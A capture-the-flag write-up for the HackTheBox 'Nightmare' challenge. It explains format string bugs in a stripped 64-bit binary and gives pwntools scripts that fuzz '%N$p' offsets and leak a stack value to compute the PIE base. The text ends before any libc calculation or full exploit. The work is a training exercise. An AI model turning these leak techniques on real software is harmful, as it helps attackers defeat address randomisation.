# Nightmare
> Write-up author: jon-brandy
## DESCRIPTION:
You seem to be stuck in an endless nightmare. Can you find a way out?
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary , stripped, and with **NO RELRO**.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/05cea160-e903-4d4d-a710-7caac4a7acad)

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/4ba73284-daca-4972-98d7-029cc3d7751c)


2. The exploit here is we need to leak the leak and calculate the piebase and libc_base then.
3. After decompiled the binary using ghidra, i noticed there's a format string vulnerability for first option menu and second option menu.

> This function called when user choose the 1st option menu.

#### NOTES: The format string vuln found at line 12, the binary seems not specify the output format.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/8e3b5d39-54d2-4899-b8d8-1628b7c5e2ec)


> This function called when user choose the 2nd option menu.

#### NOTES: The format strings vuln found at line 19.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/4034274f-e571-4ff5-b207-26f3010dbd35)


4. Well seems like the intended approach to leak the piebase and libc_base are from the format strings, because there are no potential bufferoverflow.
5. I chose to use the first option, this is the script i used to leak the piebase and libc_base.

> Fuzzy script

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
piebase
breakrva 0x138c
continue
'''.format(**locals())

exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()

for i in range(100):
    try:
        #sh = process()
        sh.sendlineafter(b'>', b'1')
        sh.recvuntil(b'>')
        print("Iter {}:".format(i))
        sh.sendline('%{}$p'.format(i))
        sh.recvuntil(b'> ')
        get = sh.recvlineS()
        print(get)
        #sh.close()
    except EOFError:
        pass

sh.interactive()
```

6. Don't forget to set the GDB script for breakpoint at the `fprintf` so we can use the value leaked for calculating and comparing the piebase and libcbase.
7. But before use the GDB script, let's run with the normal mode.

> At iter 23 and 26 could be the correct one.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/d498e189-d9d3-4904-8a77-eb5e43ab4071)


8. To be honest, to find the correct PIE and libc address, usually i just calculate every address i found until it's the same as the libc_base at the binary (i bruteforced it).
9. Let's calculate the piebase first, now run the script using GDBscript.

> Keep continue, until you hit the 23th iter.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/c1a93a39-7aa5-40fa-8086-75c9f8458982)


> Checking the piebase

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/0055561f-c156-4752-a8b1-e69b00b3be39)

> Calculating piebase

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/e2969d0d-7484-4aa5-97be-aa86046c2ebc)


10. This means we need to minus the leaked pie with `13792`.

> SCRIPT

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
piebase
breakrva 0x138c
continue
'''.format(**locals())

exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()

'''
for i in range(100):
    try:
        #sh = process()
        sh.sendlineafter(b'>', b'1')
        sh.recvuntil(b'>')
        print("Iter {}:".format(i))
        sh.sendline('%{}$p'.format(i))
        sh.recvuntil(b'> ')
        get = sh.recvlineS()
        print(get)
        #sh.close()
    except EOFError:
        pass
'''

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%23$p')
sh.recvuntil(b'>')
get_leak_pie = sh.recvlineS()
leak = int(get_leak_pie, 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

sh.interactive()
```

> RESULT - GOT THE SAME RESULT - Means we grab the correct one.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/d79abe08-d25d-4173-a356-569d623f40c2)

